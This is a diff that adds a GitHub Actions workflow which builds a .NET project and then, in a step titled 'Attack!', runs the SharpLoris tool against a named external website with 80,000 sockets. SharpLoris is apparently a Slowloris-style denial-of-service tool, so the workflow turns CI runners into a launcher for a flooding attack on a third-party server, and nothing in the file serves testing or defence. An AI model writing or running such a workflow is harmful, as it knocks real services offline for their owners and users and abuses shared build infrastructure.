@@ -1,0 +1,26 @@
+name: .NET
+
+on:
+  repository_dispatch:
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v2
+
+    - name: Setup .NET
+      uses: actions/setup-dotnet@v1
+      with:
+        dotnet-version: 5.0.x
+
+    - name: Restore dependencies
+      run: dotnet restore --configuration Release
+      
+    - name: Build
+      run: dotnet build --no-restore --configuration Release
+    
+    - name: Attack!
+      run: dotnet run SharpLoris-master\SharpLoris\bin\Release\Sharploris.exe -host https://www.hellominers.com sockcount=80000
